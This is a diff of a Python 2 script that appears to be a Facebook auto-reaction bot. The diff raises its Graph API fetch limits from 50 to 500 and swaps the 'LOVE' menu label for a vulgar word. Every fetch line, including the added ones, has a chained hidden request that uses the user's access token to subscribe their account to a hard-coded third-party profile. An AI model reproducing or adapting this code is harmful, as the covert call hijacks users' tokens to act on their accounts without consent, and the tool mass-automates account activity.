@@ -149,7 +149,7 @@ def menu_reaction():
  ----------   ------------------------------------
 
    [ 01 ]      like
-   [ 02 ]      reaction 'LOVE'
+   [ 02 ]      reaction 'MEMEK'
    [ 03 ]      reaction 'WOW'
    [ 04 ]      reaction 'HAHA'
    [ 05 ]      reaction 'SAD'
@@ -214,7 +214,7 @@ def post():
 	  if WT == 'wallpost':
 		print '[*] fetching all posts id'
 
-		r = requests.get('https://graph.facebook.com/me?fields=home.limit(50)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get('https://graph.facebook.com/me?fields=home.limit(500)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['home']['data']:
@@ -234,7 +234,7 @@ def post():
 	  elif WT == 'req':
 		print '[*] fetching all friends requests'
 
-		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=50&access_token=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=500&access_token=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['data']:
@@ -254,14 +254,14 @@ def post():
 	  elif WT == 'subs':
 		print '[*] fetching all friends id'
 
-		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=50&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=500&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['data']:
 			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.01)
 		return result
 	  else:
-		r = requests.get("https://graph.facebook.com/%s?fields=feed.limit(50)&access_token=%s"%(id,token));requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get("https://graph.facebook.com/%s?fields=feed.limit(500)&access_token=%s"%(id,token));requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['feed']['data']:
